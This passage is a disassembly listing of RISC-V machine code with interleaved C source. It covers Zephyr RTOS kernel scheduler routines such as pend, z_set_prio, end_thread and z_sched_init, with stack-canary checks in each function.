8000575a:	cc11                	beqz	s0,80005776 <unpend_all+0x38>
		unpend_thread_no_timeout(thread);
8000575c:	8522                	mv	a0,s0
8000575e:	b13ff0ef          	jal	ra,80005270 <unpend_thread_no_timeout>
}

static inline int z_abort_thread_timeout(struct k_thread *thread)
{
	return z_abort_timeout(&thread->base.timeout);
80005762:	01840513          	addi	a0,s0,24
80005766:	08d000ef          	jal	ra,80005ff2 <z_abort_timeout>
8000576a:	08042023          	sw	zero,128(s0)
		(void)z_abort_thread_timeout(thread);
		arch_thread_return_value_set(thread, 0);
		ready_thread(thread);
8000576e:	8522                	mv	a0,s0
80005770:	ddbff0ef          	jal	ra,8000554a <ready_thread>
80005774:	b7c5                	j	80005754 <unpend_all+0x16>
	}
}
80005776:	8000c7b7          	lui	a5,0x8000c
8000577a:	4732                	lw	a4,12(sp)
8000577c:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005780:	8fb9                	xor	a5,a5,a4
80005782:	4701                	li	a4,0
80005784:	e791                	bnez	a5,80005790 <unpend_all+0x52>
80005786:	40f2                	lw	ra,28(sp)
80005788:	4462                	lw	s0,24(sp)
8000578a:	44d2                	lw	s1,20(sp)
8000578c:	6105                	addi	sp,sp,32
8000578e:	8082                	ret
80005790:	238d                	jal	80005cf2 <_StackCheckHandler>

80005792 <unready_thread>:
{
80005792:	1101                	addi	sp,sp,-32
80005794:	ce06                	sw	ra,28(sp)
80005796:	cc22                	sw	s0,24(sp)
80005798:	842a                	mv	s0,a0
8000579a:	8000c7b7          	lui	a5,0x8000c
8000579e:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800057a2:	c63a                	sw	a4,12(sp)
800057a4:	4701                	li	a4,0
	return (thread->base.thread_state & state) != 0U;
800057a6:	00d54783          	lbu	a5,13(a0)
	if (z_is_thread_queued(thread)) {
800057aa:	01879713          	slli	a4,a5,0x18
800057ae:	8761                	srai	a4,a4,0x18
800057b0:	02074863          	bltz	a4,800057e0 <unready_thread+0x4e>
	update_cache(thread == _current);
800057b4:	800097b7          	lui	a5,0x80009
800057b8:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800057bc:	4788                	lw	a0,8(a5)
800057be:	8d01                	sub	a0,a0,s0
800057c0:	00153513          	seqz	a0,a0
800057c4:	b29ff0ef          	jal	ra,800052ec <update_cache>
}
800057c8:	8000c7b7          	lui	a5,0x8000c
800057cc:	4732                	lw	a4,12(sp)
800057ce:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800057d2:	8fb9                	xor	a5,a5,a4
800057d4:	4701                	li	a4,0
800057d6:	e38d                	bnez	a5,800057f8 <unready_thread+0x66>
800057d8:	40f2                	lw	ra,28(sp)
800057da:	4462                	lw	s0,24(sp)
800057dc:	6105                	addi	sp,sp,32
800057de:	8082                	ret
	thread->base.thread_state &= ~_THREAD_QUEUED;
800057e0:	07f7f793          	andi	a5,a5,127
800057e4:	00f506a3          	sb	a5,13(a0)
	_priq_run_remove(thread_runq(thread), thread);
800057e8:	85aa                	mv	a1,a0
800057ea:	80009537          	lui	a0,0x80009
800057ee:	53c50513          	addi	a0,a0,1340 # 8000953c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000953d>
800057f2:	a49ff0ef          	jal	ra,8000523a <z_priq_dumb_remove>
}
800057f6:	bf7d                	j	800057b4 <unready_thread+0x22>
}
800057f8:	29ed                	jal	80005cf2 <_StackCheckHandler>

800057fa <add_to_waitq_locked>:
{
800057fa:	1101                	addi	sp,sp,-32
800057fc:	ce06                	sw	ra,28(sp)
800057fe:	cc22                	sw	s0,24(sp)
80005800:	ca26                	sw	s1,20(sp)
80005802:	c84a                	sw	s2,16(sp)
80005804:	84aa                	mv	s1,a0
80005806:	892e                	mv	s2,a1
80005808:	8000c7b7          	lui	a5,0x8000c
8000580c:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005810:	c63a                	sw	a4,12(sp)
80005812:	4701                	li	a4,0
	unready_thread(thread);
80005814:	f7fff0ef          	jal	ra,80005792 <unready_thread>
	thread->base.thread_state |= _THREAD_PENDING;
80005818:	00d4c783          	lbu	a5,13(s1)
8000581c:	0027e793          	ori	a5,a5,2
80005820:	00f486a3          	sb	a5,13(s1)
	if (wait_q != NULL) {
80005824:	04090763          	beqz	s2,80005872 <add_to_waitq_locked+0x78>
		thread->base.pended_on = wait_q;
80005828:	0124a423          	sw	s2,8(s1)
	return list->head == list;
8000582c:	00092403          	lw	s0,0(s2)
	return sys_dlist_is_empty(list) ? NULL : list->head;
80005830:	00891b63          	bne	s2,s0,80005846 <add_to_waitq_locked+0x4c>
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
80005834:	4401                	li	s0,0
80005836:	a801                	j	80005846 <add_to_waitq_locked+0x4c>
	sys_dnode_t *const prev = successor->prev;
80005838:	405c                	lw	a5,4(s0)
	node->prev = prev;
8000583a:	c0dc                	sw	a5,4(s1)
	node->next = successor;
8000583c:	c080                	sw	s0,0(s1)
	prev->next = node;
8000583e:	c384                	sw	s1,0(a5)
	successor->prev = node;
80005840:	c044                	sw	s1,4(s0)
}
80005842:	a805                	j	80005872 <add_to_waitq_locked+0x78>
80005844:	4401                	li	s0,0
80005846:	cc11                	beqz	s0,80005862 <add_to_waitq_locked+0x68>
		if (z_sched_prio_cmp(thread, t) > 0) {
80005848:	85a2                	mv	a1,s0
8000584a:	8526                	mv	a0,s1
8000584c:	df6ff0ef          	jal	ra,80004e42 <z_sched_prio_cmp>
80005850:	fea044e3          	bgtz	a0,80005838 <add_to_waitq_locked+0x3e>
	return (node != NULL) ? sys_dlist_peek_next_no_check(list, node) : NULL;
80005854:	d86d                	beqz	s0,80005846 <add_to_waitq_locked+0x4c>
	return (node == list->tail) ? NULL : node->next;
80005856:	00492703          	lw	a4,4(s2)
8000585a:	fee405e3          	beq	s0,a4,80005844 <add_to_waitq_locked+0x4a>
8000585e:	4000                	lw	s0,0(s0)
80005860:	b7dd                	j	80005846 <add_to_waitq_locked+0x4c>
	sys_dnode_t *const tail = list->tail;
80005862:	00492783          	lw	a5,4(s2)
	node->next = list;
80005866:	0124a023          	sw	s2,0(s1)
	node->prev = tail;
8000586a:	c0dc                	sw	a5,4(s1)
	tail->next = node;
8000586c:	c384                	sw	s1,0(a5)
	list->tail = node;
8000586e:	00992223          	sw	s1,4(s2)
}
80005872:	8000c7b7          	lui	a5,0x8000c
80005876:	4732                	lw	a4,12(sp)
80005878:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000587c:	8fb9                	xor	a5,a5,a4
8000587e:	4701                	li	a4,0
80005880:	e799                	bnez	a5,8000588e <add_to_waitq_locked+0x94>
80005882:	40f2                	lw	ra,28(sp)
80005884:	4462                	lw	s0,24(sp)
80005886:	44d2                	lw	s1,20(sp)
80005888:	4942                	lw	s2,16(sp)
8000588a:	6105                	addi	sp,sp,32
8000588c:	8082                	ret
8000588e:	2195                	jal	80005cf2 <_StackCheckHandler>

80005890 <pend>:
{
80005890:	7179                	addi	sp,sp,-48
80005892:	d606                	sw	ra,44(sp)
80005894:	d422                	sw	s0,40(sp)
80005896:	d226                	sw	s1,36(sp)
80005898:	d04a                	sw	s2,32(sp)
8000589a:	ce4e                	sw	s3,28(sp)
8000589c:	cc52                	sw	s4,24(sp)
8000589e:	842a                	mv	s0,a0
800058a0:	84ae                	mv	s1,a1
800058a2:	8a32                	mv	s4,a2
800058a4:	89b6                	mv	s3,a3
800058a6:	8000c7b7          	lui	a5,0x8000c
800058aa:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800058ae:	c63a                	sw	a4,12(sp)
800058b0:	4701                	li	a4,0
	LOCKED(&sched_spinlock) {
800058b2:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
800058b4:	30047973          	csrrci	s2,mstatus,8
800058b8:	a811                	j	800058cc <pend+0x3c>
		add_to_waitq_locked(thread, wait_q);
800058ba:	85a6                	mv	a1,s1
800058bc:	8522                	mv	a0,s0
800058be:	f3dff0ef          	jal	ra,800057fa <add_to_waitq_locked>
			  : "r" (key & MSTATUS_IEN)
800058c2:	00897793          	andi	a5,s2,8
	__asm__ volatile ("csrs mstatus, %0"
800058c6:	3007a073          	csrs	mstatus,a5
	LOCKED(&sched_spinlock) {
800058ca:	4785                	li	a5,1
800058cc:	d7fd                	beqz	a5,800058ba <pend+0x2a>
	add_thread_timeout(thread, timeout);
800058ce:	85d2                	mv	a1,s4
800058d0:	864e                	mv	a2,s3
800058d2:	8522                	mv	a0,s0
800058d4:	d28ff0ef          	jal	ra,80004dfc <add_thread_timeout>
}
800058d8:	8000c7b7          	lui	a5,0x8000c
800058dc:	4732                	lw	a4,12(sp)
800058de:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800058e2:	8fb9                	xor	a5,a5,a4
800058e4:	4701                	li	a4,0
800058e6:	eb89                	bnez	a5,800058f8 <pend+0x68>
800058e8:	50b2                	lw	ra,44(sp)
800058ea:	5422                	lw	s0,40(sp)
800058ec:	5492                	lw	s1,36(sp)
800058ee:	5902                	lw	s2,32(sp)
800058f0:	49f2                	lw	s3,28(sp)
800058f2:	4a62                	lw	s4,24(sp)
800058f4:	6145                	addi	sp,sp,48
800058f6:	8082                	ret
800058f8:	2eed                	jal	80005cf2 <_StackCheckHandler>

800058fa <z_pend_curr>:
{
800058fa:	1101                	addi	sp,sp,-32
800058fc:	ce06                	sw	ra,28(sp)
800058fe:	cc22                	sw	s0,24(sp)
80005900:	ca26                	sw	s1,20(sp)
80005902:	c84a                	sw	s2,16(sp)
80005904:	842a                	mv	s0,a0
80005906:	84ae                	mv	s1,a1
80005908:	85b2                	mv	a1,a2
8000590a:	8636                	mv	a2,a3
8000590c:	86ba                	mv	a3,a4
8000590e:	8000c937          	lui	s2,0x8000c
80005912:	95092783          	lw	a5,-1712(s2) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005916:	c63e                	sw	a5,12(sp)
80005918:	4781                	li	a5,0
	pend(_current, wait_q, timeout);
8000591a:	800097b7          	lui	a5,0x80009
8000591e:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005922:	4788                	lw	a0,8(a5)
80005924:	f6dff0ef          	jal	ra,80005890 <pend>
	return z_swap(lock, key);
80005928:	85a6                	mv	a1,s1
8000592a:	8522                	mv	a0,s0
8000592c:	fdcff0ef          	jal	ra,80005108 <z_swap>
}
80005930:	4732                	lw	a4,12(sp)
80005932:	95092783          	lw	a5,-1712(s2)
80005936:	8fb9                	xor	a5,a5,a4
80005938:	4701                	li	a4,0
8000593a:	e799                	bnez	a5,80005948 <z_pend_curr+0x4e>
8000593c:	40f2                	lw	ra,28(sp)
8000593e:	4462                	lw	s0,24(sp)
80005940:	44d2                	lw	s1,20(sp)
80005942:	4942                	lw	s2,16(sp)
80005944:	6105                	addi	sp,sp,32
80005946:	8082                	ret
80005948:	266d                	jal	80005cf2 <_StackCheckHandler>

8000594a <z_set_prio>:
{
8000594a:	7179                	addi	sp,sp,-48
8000594c:	d606                	sw	ra,44(sp)
8000594e:	d422                	sw	s0,40(sp)
80005950:	d226                	sw	s1,36(sp)
80005952:	d04a                	sw	s2,32(sp)
80005954:	ce4e                	sw	s3,28(sp)
80005956:	cc52                	sw	s4,24(sp)
80005958:	ca56                	sw	s5,20(sp)
8000595a:	84aa                	mv	s1,a0
8000595c:	892e                	mv	s2,a1
8000595e:	8000c7b7          	lui	a5,0x8000c
80005962:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005966:	c63a                	sw	a4,12(sp)
80005968:	4701                	li	a4,0
	LOCKED(&sched_spinlock) {
8000596a:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
8000596c:	300479f3          	csrrci	s3,mstatus,8
	bool need_sched = 0;
80005970:	4501                	li	a0,0
80005972:	a09d                	j	800059d8 <z_set_prio+0x8e>
	sys_dnode_t *const prev = successor->prev;
80005974:	405c                	lw	a5,4(s0)
	node->prev = prev;
80005976:	c0dc                	sw	a5,4(s1)
	node->next = successor;
80005978:	c080                	sw	s0,0(s1)
	prev->next = node;
8000597a:	c384                	sw	s1,0(a5)
	successor->prev = node;
8000597c:	c044                	sw	s1,4(s0)
}
8000597e:	a081                	j	800059be <z_set_prio+0x74>
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
80005980:	8452                	mv	s0,s4
80005982:	c00d                	beqz	s0,800059a4 <z_set_prio+0x5a>
		if (z_sched_prio_cmp(thread, t) > 0) {
80005984:	85a2                	mv	a1,s0
80005986:	8526                	mv	a0,s1
80005988:	cbaff0ef          	jal	ra,80004e42 <z_sched_prio_cmp>
8000598c:	fea044e3          	bgtz	a0,80005974 <z_set_prio+0x2a>
	return (node != NULL) ? sys_dlist_peek_next_no_check(list, node) : NULL;
80005990:	d86d                	beqz	s0,80005982 <z_set_prio+0x38>
	return (node == list->tail) ? NULL : node->next;
80005992:	800097b7          	lui	a5,0x80009
80005996:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
8000599a:	539c                	lw	a5,32(a5)
8000599c:	fef402e3          	beq	s0,a5,80005980 <z_set_prio+0x36>
800059a0:	4000                	lw	s0,0(s0)
800059a2:	b7c5                	j	80005982 <z_set_prio+0x38>
	sys_dnode_t *const tail = list->tail;
800059a4:	800097b7          	lui	a5,0x80009
800059a8:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
800059ac:	5394                	lw	a3,32(a5)
	node->next = list;
800059ae:	80009737          	lui	a4,0x80009
800059b2:	53c70713          	addi	a4,a4,1340 # 8000953c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000953d>
800059b6:	c098                	sw	a4,0(s1)
	node->prev = tail;
800059b8:	c0d4                	sw	a3,4(s1)
	tail->next = node;
800059ba:	c284                	sw	s1,0(a3)
	list->tail = node;
800059bc:	d384                	sw	s1,32(a5)
			update_cache(1);
800059be:	4505                	li	a0,1
800059c0:	92dff0ef          	jal	ra,800052ec <update_cache>
	return !((z_is_thread_prevented_from_running(thread)) != 0U ||
800059c4:	4505                	li	a0,1
800059c6:	a021                	j	800059ce <z_set_prio+0x84>
			thread->base.prio = prio;
800059c8:	01248723          	sb	s2,14(s1)
800059cc:	4501                	li	a0,0
			  : "r" (key & MSTATUS_IEN)
800059ce:	0089f793          	andi	a5,s3,8
	__asm__ volatile ("csrs mstatus, %0"
800059d2:	3007a073          	csrs	mstatus,a5
	LOCKED(&sched_spinlock) {
800059d6:	4785                	li	a5,1
800059d8:	eba1                	bnez	a5,80005a28 <z_set_prio+0xde>
	uint8_t state = thread->base.thread_state;
800059da:	00d4c783          	lbu	a5,13(s1)
	return !((z_is_thread_prevented_from_running(thread)) != 0U ||
800059de:	01f7f713          	andi	a4,a5,31
800059e2:	f37d                	bnez	a4,800059c8 <z_set_prio+0x7e>
	return node->next != NULL;
800059e4:	0184aa03          	lw	s4,24(s1)
800059e8:	fe0a10e3          	bnez	s4,800059c8 <z_set_prio+0x7e>
	thread->base.thread_state &= ~_THREAD_QUEUED;
800059ec:	07f7f793          	andi	a5,a5,127
800059f0:	00f486a3          	sb	a5,13(s1)
	_priq_run_remove(thread_runq(thread), thread);
800059f4:	85a6                	mv	a1,s1
800059f6:	80009ab7          	lui	s5,0x80009
800059fa:	53ca8513          	addi	a0,s5,1340 # 8000953c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000953d>
800059fe:	83dff0ef          	jal	ra,8000523a <z_priq_dumb_remove>
				thread->base.prio = prio;
80005a02:	01248723          	sb	s2,14(s1)
	thread->base.thread_state |= _THREAD_QUEUED;
80005a06:	00d4c783          	lbu	a5,13(s1)
80005a0a:	f807e793          	ori	a5,a5,-128
80005a0e:	00f486a3          	sb	a5,13(s1)
	return list->head == list;
80005a12:	800097b7          	lui	a5,0x80009
80005a16:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005a1a:	4fc0                	lw	s0,28(a5)
	return sys_dlist_is_empty(list) ? NULL : list->head;
80005a1c:	53ca8a93          	addi	s5,s5,1340
80005a20:	f75411e3          	bne	s0,s5,80005982 <z_set_prio+0x38>
	SYS_DLIST_FOR_EACH_CONTAINER(pq, t, base.qnode_dlist) {
80005a24:	8452                	mv	s0,s4
80005a26:	bfb1                	j	80005982 <z_set_prio+0x38>
}
80005a28:	8000c7b7          	lui	a5,0x8000c
80005a2c:	4732                	lw	a4,12(sp)
80005a2e:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005a32:	8fb9                	xor	a5,a5,a4
80005a34:	4701                	li	a4,0
80005a36:	eb91                	bnez	a5,80005a4a <z_set_prio+0x100>
80005a38:	50b2                	lw	ra,44(sp)
80005a3a:	5422                	lw	s0,40(sp)
80005a3c:	5492                	lw	s1,36(sp)
80005a3e:	5902                	lw	s2,32(sp)
80005a40:	49f2                	lw	s3,28(sp)
80005a42:	4a62                	lw	s4,24(sp)
80005a44:	4ad2                	lw	s5,20(sp)
80005a46:	6145                	addi	sp,sp,48
80005a48:	8082                	ret
80005a4a:	2465                	jal	80005cf2 <_StackCheckHandler>

80005a4c <k_sched_unlock>:
{
80005a4c:	1101                	addi	sp,sp,-32
80005a4e:	ce06                	sw	ra,28(sp)
80005a50:	cc22                	sw	s0,24(sp)
80005a52:	8000c7b7          	lui	a5,0x8000c
80005a56:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005a5a:	c63a                	sw	a4,12(sp)
80005a5c:	4701                	li	a4,0
	LOCKED(&sched_spinlock) {
80005a5e:	4781                	li	a5,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80005a60:	30047473          	csrrci	s0,mstatus,8
80005a64:	a01d                	j	80005a8a <k_sched_unlock+0x3e>
		++_current->base.sched_locked;
80005a66:	800097b7          	lui	a5,0x80009
80005a6a:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
80005a6e:	4798                	lw	a4,8(a5)
80005a70:	00f74783          	lbu	a5,15(a4)
80005a74:	0785                	addi	a5,a5,1
80005a76:	00f707a3          	sb	a5,15(a4)
		update_cache(0);
80005a7a:	4501                	li	a0,0
80005a7c:	871ff0ef          	jal	ra,800052ec <update_cache>
			  : "r" (key & MSTATUS_IEN)
80005a80:	00847793          	andi	a5,s0,8
	__asm__ volatile ("csrs mstatus, %0"
80005a84:	3007a073          	csrs	mstatus,a5
	LOCKED(&sched_spinlock) {
80005a88:	4785                	li	a5,1
80005a8a:	dff1                	beqz	a5,80005a66 <k_sched_unlock+0x1a>
	__asm__ volatile ("csrrc %0, mstatus, %1"
80005a8c:	30047573          	csrrci	a0,mstatus,8
	(void) z_reschedule_irqlock(arch_irq_lock());
80005a90:	e36ff0ef          	jal	ra,800050c6 <z_reschedule_irqlock>
}
80005a94:	8000c7b7          	lui	a5,0x8000c
80005a98:	4732                	lw	a4,12(sp)
80005a9a:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005a9e:	8fb9                	xor	a5,a5,a4
80005aa0:	4701                	li	a4,0
80005aa2:	e789                	bnez	a5,80005aac <k_sched_unlock+0x60>
80005aa4:	40f2                	lw	ra,28(sp)
80005aa6:	4462                	lw	s0,24(sp)
80005aa8:	6105                	addi	sp,sp,32
80005aaa:	8082                	ret
80005aac:	2499                	jal	80005cf2 <_StackCheckHandler>

80005aae <end_thread>:
#ifdef CONFIG_CMSIS_RTOS_V1
extern void z_thread_cmsis_status_mask_clear(struct k_thread *thread);
#endif

static void end_thread(struct k_thread *thread)
{
80005aae:	1101                	addi	sp,sp,-32
80005ab0:	ce06                	sw	ra,28(sp)
80005ab2:	cc22                	sw	s0,24(sp)
80005ab4:	8000c7b7          	lui	a5,0x8000c
80005ab8:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005abc:	c63a                	sw	a4,12(sp)
80005abe:	4701                	li	a4,0
	/* We hold the lock, and the thread is known not to be running
	 * anywhere.
	 */
	if ((thread->base.thread_state & _THREAD_DEAD) == 0U) {
80005ac0:	00d54783          	lbu	a5,13(a0)
80005ac4:	0087f713          	andi	a4,a5,8
80005ac8:	ef1d                	bnez	a4,80005b06 <end_thread+0x58>
80005aca:	842a                	mv	s0,a0
		thread->base.thread_state |= _THREAD_DEAD;
80005acc:	0087e713          	ori	a4,a5,8
80005ad0:	00e506a3          	sb	a4,13(a0)
		thread->base.thread_state &= ~_THREAD_ABORTING;
80005ad4:	fdf7f713          	andi	a4,a5,-33
80005ad8:	00876713          	ori	a4,a4,8
80005adc:	00e506a3          	sb	a4,13(a0)
		if (z_is_thread_queued(thread)) {
80005ae0:	0762                	slli	a4,a4,0x18
80005ae2:	8761                	srai	a4,a4,0x18
80005ae4:	02074d63          	bltz	a4,80005b1e <end_thread+0x70>
			dequeue_thread(thread);
		}
		if (thread->base.pended_on != NULL) {
80005ae8:	441c                	lw	a5,8(s0)
80005aea:	c781                	beqz	a5,80005af2 <end_thread+0x44>
			unpend_thread_no_timeout(thread);
80005aec:	8522                	mv	a0,s0
80005aee:	f82ff0ef          	jal	ra,80005270 <unpend_thread_no_timeout>
80005af2:	01840513          	addi	a0,s0,24
80005af6:	29f5                	jal	80005ff2 <z_abort_timeout>
		}
		(void)z_abort_thread_timeout(thread);
		unpend_all(&thread->join_queue);
80005af8:	06c40513          	addi	a0,s0,108
80005afc:	c43ff0ef          	jal	ra,8000573e <unpend_all>
		update_cache(1);
80005b00:	4505                	li	a0,1
80005b02:	feaff0ef          	jal	ra,800052ec <update_cache>
		z_thread_perms_all_clear(thread);
		z_object_uninit(thread->stack_obj);
		z_object_uninit(thread);
#endif
	}
}
80005b06:	8000c7b7          	lui	a5,0x8000c
80005b0a:	4732                	lw	a4,12(sp)
80005b0c:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005b10:	8fb9                	xor	a5,a5,a4
80005b12:	4701                	li	a4,0
80005b14:	e39d                	bnez	a5,80005b3a <end_thread+0x8c>
80005b16:	40f2                	lw	ra,28(sp)
80005b18:	4462                	lw	s0,24(sp)
80005b1a:	6105                	addi	sp,sp,32
80005b1c:	8082                	ret
	thread->base.thread_state &= ~_THREAD_QUEUED;
80005b1e:	05f7f793          	andi	a5,a5,95
80005b22:	0087e793          	ori	a5,a5,8
80005b26:	00f506a3          	sb	a5,13(a0)
	_priq_run_remove(thread_runq(thread), thread);
80005b2a:	85aa                	mv	a1,a0
80005b2c:	80009537          	lui	a0,0x80009
80005b30:	53c50513          	addi	a0,a0,1340 # 8000953c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000953d>
80005b34:	f06ff0ef          	jal	ra,8000523a <z_priq_dumb_remove>
}
80005b38:	bf45                	j	80005ae8 <end_thread+0x3a>
}
80005b3a:	2a65                	jal	80005cf2 <_StackCheckHandler>

80005b3c <z_unpend_first_thread>:
{
80005b3c:	1101                	addi	sp,sp,-32
80005b3e:	ce06                	sw	ra,28(sp)
80005b40:	cc22                	sw	s0,24(sp)
80005b42:	ca26                	sw	s1,20(sp)
80005b44:	c84a                	sw	s2,16(sp)
80005b46:	84aa                	mv	s1,a0
80005b48:	8000c7b7          	lui	a5,0x8000c
80005b4c:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005b50:	c63a                	sw	a4,12(sp)
80005b52:	4701                	li	a4,0
	LOCKED(&sched_spinlock) {
80005b54:	4781                	li	a5,0
80005b56:	30047973          	csrrci	s2,mstatus,8
	struct k_thread *thread = NULL;
80005b5a:	4401                	li	s0,0
80005b5c:	a031                	j	80005b68 <z_unpend_first_thread+0x2c>
			  : "r" (key & MSTATUS_IEN)
80005b5e:	00897793          	andi	a5,s2,8
	__asm__ volatile ("csrs mstatus, %0"
80005b62:	3007a073          	csrs	mstatus,a5
	LOCKED(&sched_spinlock) {
80005b66:	4785                	li	a5,1
80005b68:	ef81                	bnez	a5,80005b80 <z_unpend_first_thread+0x44>
		thread = _priq_wait_best(&wait_q->waitq);
80005b6a:	8526                	mv	a0,s1
80005b6c:	f4aff0ef          	jal	ra,800052b6 <z_priq_dumb_best>
80005b70:	842a                	mv	s0,a0
		if (thread != NULL) {
80005b72:	d575                	beqz	a0,80005b5e <z_unpend_first_thread+0x22>
			unpend_thread_no_timeout(thread);
80005b74:	efcff0ef          	jal	ra,80005270 <unpend_thread_no_timeout>
80005b78:	01840513          	addi	a0,s0,24
80005b7c:	299d                	jal	80005ff2 <z_abort_timeout>
80005b7e:	b7c5                	j	80005b5e <z_unpend_first_thread+0x22>
}
80005b80:	8000c7b7          	lui	a5,0x8000c
80005b84:	4732                	lw	a4,12(sp)
80005b86:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005b8a:	8fb9                	xor	a5,a5,a4
80005b8c:	4701                	li	a4,0
80005b8e:	eb81                	bnez	a5,80005b9e <z_unpend_first_thread+0x62>
80005b90:	8522                	mv	a0,s0
80005b92:	40f2                	lw	ra,28(sp)
80005b94:	4462                	lw	s0,24(sp)
80005b96:	44d2                	lw	s1,20(sp)
80005b98:	4942                	lw	s2,16(sp)
80005b9a:	6105                	addi	sp,sp,32
80005b9c:	8082                	ret
80005b9e:	2a91                	jal	80005cf2 <_StackCheckHandler>

80005ba0 <init_ready_q>:
{
80005ba0:	1101                	addi	sp,sp,-32
80005ba2:	ce06                	sw	ra,28(sp)
80005ba4:	8000c7b7          	lui	a5,0x8000c
80005ba8:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005bac:	c63a                	sw	a4,12(sp)
80005bae:	4701                	li	a4,0
	sys_dlist_init(&rq->runq);
80005bb0:	00450713          	addi	a4,a0,4
	list->head = (sys_dnode_t *)list;
80005bb4:	c158                	sw	a4,4(a0)
	list->tail = (sys_dnode_t *)list;
80005bb6:	c518                	sw	a4,8(a0)
}
80005bb8:	4732                	lw	a4,12(sp)
80005bba:	9507a783          	lw	a5,-1712(a5)
80005bbe:	8fb9                	xor	a5,a5,a4
80005bc0:	4701                	li	a4,0
80005bc2:	e781                	bnez	a5,80005bca <init_ready_q+0x2a>
80005bc4:	40f2                	lw	ra,28(sp)
80005bc6:	6105                	addi	sp,sp,32
80005bc8:	8082                	ret
80005bca:	2225                	jal	80005cf2 <_StackCheckHandler>

80005bcc <z_sched_init>:
{
80005bcc:	1101                	addi	sp,sp,-32
80005bce:	ce06                	sw	ra,28(sp)
80005bd0:	cc22                	sw	s0,24(sp)
80005bd2:	8000c437          	lui	s0,0x8000c
80005bd6:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005bda:	c63e                	sw	a5,12(sp)
80005bdc:	4781                	li	a5,0
	init_ready_q(&_kernel.ready_q);
80005bde:	80009537          	lui	a0,0x80009
80005be2:	53850513          	addi	a0,a0,1336 # 80009538 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009539>
80005be6:	fbbff0ef          	jal	ra,80005ba0 <init_ready_q>
	k_sched_time_slice_set(CONFIG_TIMESLICE_SIZE,
80005bea:	4581                	li	a1,0
80005bec:	4501                	li	a0,0
80005bee:	ae8ff0ef          	jal	ra,80004ed6 <k_sched_time_slice_set>
}
80005bf2:	4732                	lw	a4,12(sp)
80005bf4:	95042783          	lw	a5,-1712(s0)
80005bf8:	8fb9                	xor	a5,a5,a4
80005bfa:	4701                	li	a4,0
80005bfc:	e789                	bnez	a5,80005c06 <z_sched_init+0x3a>
80005bfe:	40f2                	lw	ra,28(sp)
80005c00:	4462                	lw	s0,24(sp)
80005c02:	6105                	addi	sp,sp,32
80005c04:	8082                	ret
80005c06:	20f5                	jal	80005cf2 <_StackCheckHandler>

80005c08 <z_impl_z_current_get>:
{
80005c08:	1101                	addi	sp,sp,-32
80005c0a:	ce06                	sw	ra,28(sp)
80005c0c:	8000c737          	lui	a4,0x8000c
80005c10:	95072783          	lw	a5,-1712(a4) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80005c14:	c63e                	sw	a5,12(sp)
80005c16:	4781                	li	a5,0
	k_tid_t ret = _current_cpu->current;
80005c18:	800097b7          	lui	a5,0x80009
80005c1c:	52078793          	addi	a5,a5,1312 # 80009520 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80009521>
